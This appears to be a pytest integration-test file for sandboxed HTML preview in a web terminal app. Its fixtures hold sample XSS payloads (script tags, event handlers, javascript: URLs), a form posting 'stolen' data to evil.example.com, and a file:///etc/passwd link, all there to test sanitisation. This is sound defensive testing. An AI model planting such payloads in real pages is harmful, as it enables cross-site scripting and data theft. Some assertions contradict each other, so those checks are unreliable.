"""Integration tests for HTML preview with sandboxing.

These tests verify complete user workflows for previewing HTML files with
security sandboxing, iframe isolation, script blocking, and safe rendering
of untrusted HTML content.

CRITICAL: These tests MUST FAIL until the implementation is complete.
Tests validate end-to-end HTML preview workflows with security measures.
"""

import pytest
import json
from fastapi.testclient import TestClient
from unittest.mock import patch, MagicMock

# Import the app once it's implemented
try:
    from src.main import app
    APP_AVAILABLE = True
except ImportError:
    APP_AVAILABLE = False


class TestHTMLPreviewIntegration:
    """Test complete HTML preview with sandboxing workflows."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        if not APP_AVAILABLE:
            pytest.skip("Application not implemented yet")
        return TestClient(app)

    @pytest.fixture
    def auth_headers(self):
        """Mock authentication headers."""
        return {"Authorization": "Bearer mock-jwt-token"}

    @pytest.fixture
    def terminal_session(self, client, auth_headers):
        """Create a terminal session for testing."""
        response = client.post(
            "/api/terminal/sessions",
            json={
                "shell": "bash",
                "workingDirectory": "/tmp",
                "terminalSize": {"cols": 80, "rows": 24}
            },
            headers=auth_headers
        )
        return response.json()["sessionId"]

    @pytest.fixture
    def safe_html_content(self):
        """Safe HTML content for testing."""
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Safe HTML Test</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { color: blue; border-bottom: 1px solid #ccc; }
        .content { margin: 20px 0; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Safe HTML Document</h1>
    </div>
    <div class="content">
        <p>This is a <strong>safe</strong> HTML document with basic styling.</p>
        <ul>
            <li>Item 1</li>
            <li>Item 2</li>
            <li>Item 3</li>
        </ul>
        <a href="https://example.com">External Link</a>
    </div>
</body>
</html>"""

    @pytest.fixture
    def malicious_html_content(self):
        """Potentially malicious HTML content for security testing."""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Malicious Test</title>
</head>
<body>
    <h1>Potentially Dangerous Content</h1>

    <!-- XSS attempts -->
    <script>alert('XSS Attack!');</script>
    <img src="x" onerror="alert('Image XSS')">
    <div onclick="alert('Click XSS')">Click me</div>

    <!-- Form that could submit data -->
    <form action="https://evil.example.com/steal" method="post">
        <input type="hidden" name="data" value="stolen">
        <input type="submit" value="Submit">
    </form>

    <!-- Iframe attempting to load external content -->
    <iframe src="https://evil.example.com/malicious.html"></iframe>

    <!-- Object/embed tags -->
    <object data="malicious.swf"></object>
    <embed src="malicious.swf"></embed>

    <!-- Meta refresh redirect -->
    <meta http-equiv="refresh" content="0;url=https://evil.example.com">

    <!-- JavaScript in various contexts -->
    <svg onload="alert('SVG XSS')">
        <circle cx="50" cy="50" r="40" />
    </svg>

    <style>
        body { background: url('javascript:alert("CSS XSS")'); }
    </style>

    <link rel="stylesheet" href="javascript:alert('Link XSS')">
</body>
</html>"""

    @pytest.fixture
    def complex_html_content(self):
        """Complex but safe HTML content."""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Complex HTML Test</title>
    <style>
        .container { max-width: 800px; margin: 0 auto; }
        .code-block { background: #f4f4f4; padding: 10px; border-radius: 4px; }
        .table { border-collapse: collapse; width: 100%; }
        .table th, .table td { border: 1px solid #ddd; padding: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Complex HTML Document</h1>

        <section>
            <h2>Code Example</h2>
            <div class="code-block">
                <pre><code>function hello() {
    console.log('Hello World');
}</code></pre>
            </div>
        </section>

        <section>
            <h2>Table</h2>
            <table class="table">
                <thead>
                    <tr><th>Name</th><th>Value</th><th>Description</th></tr>
                </thead>
                <tbody>
                    <tr><td>Item 1</td><td>100</td><td>First item</td></tr>
                    <tr><td>Item 2</td><td>200</td><td>Second item</td></tr>
                </tbody>
            </table>
        </section>

        <section>
            <h2>Media</h2>
            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI0MCIgZmlsbD0iYmx1ZSIgLz4KPC9zdmc+" alt="Blue Circle">
        </section>
    </div>
</body>
</html>"""

    def test_safe_html_preview_workflow(self, client, auth_headers, terminal_session, safe_html_content):
        """Test complete workflow: upload HTML → preview in sandbox → verify rendering.

        User Story: User views HTML file in terminal and sees safe preview in sandboxed iframe
        with proper styling and content rendering.
        """
        with pytest.raises((Exception, AssertionError)):
            # Step 1: Upload HTML file
            upload_response = client.post(
                f"/api/media/upload",
                files={
                    "file": ("safe_test.html", safe_html_content.encode(), "text/html")
                },
                data={"sessionId": terminal_session},
                headers=auth_headers
            )

            assert upload_response.status_code == 201
            file_data = upload_response.json()
            file_id = file_data["mediaId"]
            assert file_data["type"] == "html"

            # Step 2: Trigger HTML preview via terminal
            with client.websocket_connect(f"/ws/terminal/{terminal_session}") as websocket:
                websocket.send_json({
                    "type": "input",
                    "data": "cat safe_test.html\r"
                })

                # Should receive HTML preview activation
                response = websocket.receive_json()
                assert response["type"] == "html_preview_activate"
                assert response["fileId"] == file_id
                assert response["sandboxed"] == True
                assert "previewUrl" in response

            # Step 3: Get sandboxed HTML content
            preview_response = client.get(
                f"/api/media/{file_id}/preview",
                params={"sandbox": "true"},
                headers=auth_headers
            )
            assert preview_response.status_code == 200

            # Verify security headers are present
            assert "Content-Security-Policy" in preview_response.headers
            assert "X-Frame-Options" in preview_response.headers
            assert "X-Content-Type-Options" in preview_response.headers

            # Step 4: Verify content is rendered but sanitized
            html_content = preview_response.text
            assert "<h1>Safe HTML Document</h1>" in html_content
            assert "font-family: Arial" in html_content  # CSS preserved
            assert "<strong>safe</strong>" in html_content  # Safe tags preserved

    def test_malicious_html_sanitization(self, client, auth_headers, terminal_session, malicious_html_content):
        """Test security: malicious HTML is properly sanitized in sandbox.

        User Story: System blocks malicious scripts and unsafe content while
        preserving safe HTML structure and content.
        """
        with pytest.raises((Exception, AssertionError)):
            # Upload malicious HTML
            upload_response = client.post(
                f"/api/media/upload",
                files={
                    "file": ("malicious_test.html", malicious_html_content.encode(), "text/html")
                },
                data={"sessionId": terminal_session},
                headers=auth_headers
            )
            file_id = upload_response.json()["mediaId"]

            # Get sanitized preview
            preview_response = client.get(
                f"/api/media/{file_id}/preview",
                params={"sandbox": "true", "sanitize": "true"},
                headers=auth_headers
            )
            assert preview_response.status_code == 200
            sanitized_html = preview_response.text

            # Verify malicious content is removed
            assert "<script>" not in sanitized_html.lower()
            assert "alert(" not in sanitized_html
            assert "onerror=" not in sanitized_html.lower()
            assert "onclick=" not in sanitized_html.lower()
            assert "onload=" not in sanitized_html.lower()
            assert "javascript:" not in sanitized_html.lower()
            assert "<iframe" not in sanitized_html.lower()
            assert "<object" not in sanitized_html.lower()
            assert "<embed" not in sanitized_html.lower()
            assert "http-equiv=\"refresh\"" not in sanitized_html.lower()

            # Verify safe content is preserved
            assert "<h1>Potentially Dangerous Content</h1>" in sanitized_html
            assert "<form" in sanitized_html  # Forms can be preserved but action removed
            assert "action=" not in sanitized_html  # But action attribute removed

            # Verify CSP headers prevent script execution
            csp_header = preview_response.headers.get("Content-Security-Policy", "")
            assert "script-src 'none'" in csp_header or "'unsafe-inline'" not in csp_header

    def test_html_iframe_sandboxing(self, client, auth_headers, terminal_session, complex_html_content):
        """Test iframe sandboxing configuration and restrictions.

        User Story: HTML content is rendered in properly configured sandbox iframe
        with restricted permissions and origin isolation.
        """
        with pytest.raises((Exception, AssertionError)):
            # Upload complex HTML
            upload_response = client.post(
                f"/api/media/upload",
                files={
                    "file": ("complex_test.html", complex_html_content.encode(), "text/html")
                },
                data={"sessionId": terminal_session},
                headers=auth_headers
            )
            file_id = upload_response.json()["mediaId"]

            # Get iframe configuration
            iframe_response = client.get(
                f"/api/media/{file_id}/iframe-config",
                headers=auth_headers
            )
            assert iframe_response.status_code == 200
            iframe_config = iframe_response.json()

            # Verify sandbox restrictions
            assert iframe_config["sandbox"]["allowScripts"] == False
            assert iframe_config["sandbox"]["allowForms"] == False
            assert iframe_config["sandbox"]["allowModals"] == False
            assert iframe_config["sandbox"]["allowPopups"] == False
            assert iframe_config["sandbox"]["allowSameOrigin"] == False

            # Verify iframe URL is properly scoped
            assert iframe_config["src"].startswith("/api/media/")
            assert "sandbox=true" in iframe_config["src"]

            # Test iframe rendering
            with client.websocket_connect(f"/ws/terminal/{terminal_session}") as websocket:
                websocket.send_json({
                    "type": "input",
                    "data": "cat complex_test.html\r"
                })

                response = websocket.receive_json()
                assert response["type"] == "html_preview_activate"
                assert response["iframeConfig"]["sandbox"] == "allow-same-origin"

    def test_html_preview_security_headers(self, client, auth_headers, terminal_session, safe_html_content):
        """Test security headers and MIME type handling for HTML preview.

        User Story: System sets proper security headers to prevent clickjacking,
        MIME sniffing, and other security issues.
        """
        with pytest.raises((Exception, AssertionError)):
            # Upload HTML
            upload_response = client.post(
                f"/api/media/upload",
                files={
                    "file": ("security_test.html", safe_html_content.encode(), "text/html")
                },
                data={"sessionId": terminal_session},
                headers=auth_headers
            )
            file_id = upload_response.json()["mediaId"]

            # Test security headers
            preview_response = client.get(
                f"/api/media/{file_id}/preview",
                headers=auth_headers
            )

            # Verify all required security headers
            headers = preview_response.headers

            # Content Security Policy
            assert "Content-Security-Policy" in headers
            csp = headers["Content-Security-Policy"]
            assert "default-src 'self'" in csp
            assert "script-src 'none'" in csp or "script-src 'self'" in csp
            assert "object-src 'none'" in csp

            # Frame options
            assert "X-Frame-Options" in headers
            assert headers["X-Frame-Options"] in ["DENY", "SAMEORIGIN"]

            # Content type options
            assert "X-Content-Type-Options" in headers
            assert headers["X-Content-Type-Options"] == "nosniff"

            # Referrer policy
            assert "Referrer-Policy" in headers
            assert headers["Referrer-Policy"] in ["no-referrer", "same-origin"]

            # HTTPS only (if applicable)
            if preview_response.url.startswith("https://"):
                assert "Strict-Transport-Security" in headers

    def test_html_resource_loading_restrictions(self, client, auth_headers, terminal_session):
        """Test restrictions on external resource loading in HTML preview.

        User Story: HTML preview blocks external resources (images, stylesheets, fonts)
        to prevent data leakage and tracking.
        """
        with pytest.raises((Exception, AssertionError)):
            # HTML with external resources
            html_with_externals = """<!DOCTYPE html>
<html>
<head>
    <title>External Resources Test</title>
    <link rel="stylesheet" href="https://cdn.example.com/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto');
        body { font-family: 'Roboto', sans-serif; }
    </style>
</head>
<body>
    <h1>Testing External Resources</h1>
    <img src="https://example.com/image.jpg" alt="External Image">
    <script src="https://cdn.example.com/script.js"></script>
    <iframe src="https://example.com/widget"></iframe>
</body>
</html>"""

            upload_response = client.post(
                f"/api/media/upload",
                files={
                    "file": ("externals_test.html", html_with_externals.encode(), "text/html")
                },
                data={"sessionId": terminal_session},
                headers=auth_headers
            )
            file_id = upload_response.json()["mediaId"]

            # Get preview with resource blocking
            preview_response = client.get(
                f"/api/media/{file_id}/preview",
                params={"blockExternal": "true"},
                headers=auth_headers
            )
            assert preview_response.status_code == 200

            # Verify CSP blocks external resources
            csp = preview_response.headers.get("Content-Security-Policy", "")
            assert "img-src 'self' data:" in csp
            assert "style-src 'self' 'unsafe-inline'" in csp
            assert "font-src 'self'" in csp
            assert "connect-src 'self'" in csp

            # Verify external URLs are removed or blocked
            html_content = preview_response.text
            # External resources should be removed or blocked by CSP
            # Content should still render but without external dependencies

    def test_html_preview_performance_and_size_limits(self, client, auth_headers, terminal_session):
        """Test HTML preview performance and file size limitations.

        User Story: System handles large HTML files efficiently and enforces
        reasonable size limits to prevent resource exhaustion.
        """
        with pytest.raises((Exception, AssertionError)):
            # Create large HTML content
            large_html = "<!DOCTYPE html><html><head><title>Large HTML</title></head><body>"
            large_html += "<h1>Large HTML Document</h1>"

            # Add many elements to test performance
            for i in range(1000):
                large_html += f"<div class='item-{i}'>Item {i} with content</div>"

            large_html += "</body></html>"

            # Test size limit enforcement
            if len(large_html.encode()) > 10 * 1024 * 1024:  # 10MB limit
                upload_response = client.post(
                    f"/api/media/upload",
                    files={
                        "file": ("large_test.html", large_html.encode(), "text/html")
                    },
                    data={"sessionId": terminal_session},
                    headers=auth_headers
                )
                assert upload_response.status_code == 413  # Payload too large
            else:
                # Upload and test performance
                import time

                upload_start = time.time()
                upload_response = client.post(
                    f"/api/media/upload",
                    files={
                        "file": ("large_test.html", large_html.encode(), "text/html")
                    },
                    data={"sessionId": terminal_session},
                    headers=auth_headers
                )
                upload_time = time.time() - upload_start

                assert upload_response.status_code == 201
                assert upload_time < 5.0  # Should upload within 5 seconds

                file_id = upload_response.json()["mediaId"]

                # Test preview generation performance
                preview_start = time.time()
                preview_response = client.get(
                    f"/api/media/{file_id}/preview",
                    headers=auth_headers
                )
                preview_time = time.time() - preview_start

                assert preview_response.status_code == 200
                assert preview_time < 3.0  # Should generate preview quickly

    def test_html_preview_url_validation(self, client, auth_headers, terminal_session):
        """Test URL validation and link handling in HTML preview.

        User Story: System validates and sanitizes URLs in HTML content,
        blocks malicious URLs, and handles relative links safely.
        """
        with pytest.raises((Exception, AssertionError)):
            # HTML with various types of URLs
            html_with_urls = """<!DOCTYPE html>
<html>
<body>
    <h1>URL Validation Test</h1>

    <!-- Safe URLs -->
    <a href="https://example.com">HTTPS Link</a>
    <a href="http://example.com">HTTP Link</a>
    <a href="mailto:test@example.com">Email Link</a>
    <a href="#section1">Internal Anchor</a>
    <a href="./relative/path.html">Relative Link</a>

    <!-- Potentially dangerous URLs -->
    <a href="javascript:alert('XSS')">JavaScript URL</a>
    <a href="data:text/html,<script>alert('XSS')</script>">Data URL</a>
    <a href="ftp://malicious.example.com">FTP URL</a>
    <a href="file:///etc/passwd">File URL</a>

    <!-- Images with various sources -->
    <img src="https://example.com/safe.jpg" alt="HTTPS Image">
    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="Data Image">
    <img src="javascript:alert('Image XSS')" alt="JS Image">
</body>
</html>"""

            upload_response = client.post(
                f"/api/media/upload",
                files={
                    "file": ("urls_test.html", html_with_urls.encode(), "text/html")
                },
                data={"sessionId": terminal_session},
                headers=auth_headers
            )
            file_id = upload_response.json()["mediaId"]

            # Get sanitized preview
            preview_response = client.get(
                f"/api/media/{file_id}/preview",
                params={"sanitizeUrls": "true"},
                headers=auth_headers
            )
            assert preview_response.status_code == 200
            sanitized_html = preview_response.text

            # Verify safe URLs are preserved
            assert "https://example.com" in sanitized_html
            assert "mailto:test@example.com" in sanitized_html
            assert "#section1" in sanitized_html

            # Verify dangerous URLs are removed or blocked
            assert "javascript:" not in sanitized_html
            assert "data:text/html" not in sanitized_html
            assert "ftp://" not in sanitized_html
            assert "file:///" not in sanitized_html

            # Data URLs for images should be allowed but validated
            assert "data:image/" in sanitized_html  # Safe image data URLs

    def test_html_preview_content_type_detection(self, client, auth_headers, terminal_session):
        """Test content type detection and handling for HTML files.

        User Story: System correctly identifies HTML content regardless of file extension
        and applies appropriate security measures.
        """
        with pytest.raises((Exception, AssertionError)):
            # Test various file extensions with HTML content
            html_content = "<!DOCTYPE html><html><body><h1>HTML Test</h1></body></html>"

            test_files = [
                ("test.html", "text/html"),
                ("test.htm", "text/html"),
                ("test.xhtml", "application/xhtml+xml"),
                ("test.txt", "text/plain"),  # HTML in .txt file
                ("test", "application/octet-stream")  # No extension
            ]

            for filename, expected_mime in test_files:
                upload_response = client.post(
                    f"/api/media/upload",
                    files={
                        "file": (filename, html_content.encode(), expected_mime)
                    },
                    data={"sessionId": terminal_session},
                    headers=auth_headers
                )

                if expected_mime.startswith("text/html") or expected_mime.startswith("application/xhtml"):
                    assert upload_response.status_code == 201
                    file_data = upload_response.json()
                    assert file_data["type"] == "html"

                    # Test preview works
                    file_id = file_data["mediaId"]
                    preview_response = client.get(
                        f"/api/media/{file_id}/preview",
                        headers=auth_headers
                    )
                    assert preview_response.status_code == 200

    def test_html_preview_error_handling(self, client, auth_headers, terminal_session):
        """Test error handling for malformed HTML and edge cases.

        User Story: System gracefully handles malformed HTML, encoding issues,
        and other edge cases without crashing or exposing errors.
        """
        with pytest.raises((Exception, AssertionError)):
            # Test malformed HTML
            malformed_html = """<!DOCTYPE html>
<html>
<head>
    <title>Malformed HTML
<body>
    <h1>Missing closing tags
    <p>Unclosed paragraph
    <div>
        <span>Nested unclosed
    </div>
    <img src="missing-quotes.jpg alt="broken">
    <script>
        // Unclosed script
        alert('test'
</html>"""

            upload_response = client.post(
                f"/api/media/upload",
                files={
                    "file": ("malformed.html", malformed_html.encode(), "text/html")
                },
                data={"sessionId": terminal_session},
                headers=auth_headers
            )
            file_id = upload_response.json()["mediaId"]

            # Should still generate preview despite malformed HTML
            preview_response = client.get(
                f"/api/media/{file_id}/preview",
                headers=auth_headers
            )
            assert preview_response.status_code == 200

            # Test encoding issues
            unicode_html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Unicode Test</title>
</head>
<body>
    <h1>Unicode Characters: 🚀 ✨ 🔒</h1>
    <p>Various encodings: café, naïve, résumé</p>
</body>
</html>"""

            unicode_upload = client.post(
                f"/api/media/upload",
                files={
                    "file": ("unicode.html", unicode_html.encode('utf-8'), "text/html")
                },
                data={"sessionId": terminal_session},
                headers=auth_headers
            )
            unicode_file_id = unicode_upload.json()["mediaId"]

            unicode_preview = client.get(
                f"/api/media/{unicode_file_id}/preview",
                headers=auth_headers
            )
            assert unicode_preview.status_code == 200
            assert "🚀" in unicode_preview.text or "UTF-8" in unicode_preview.headers.get("Content-Type", "")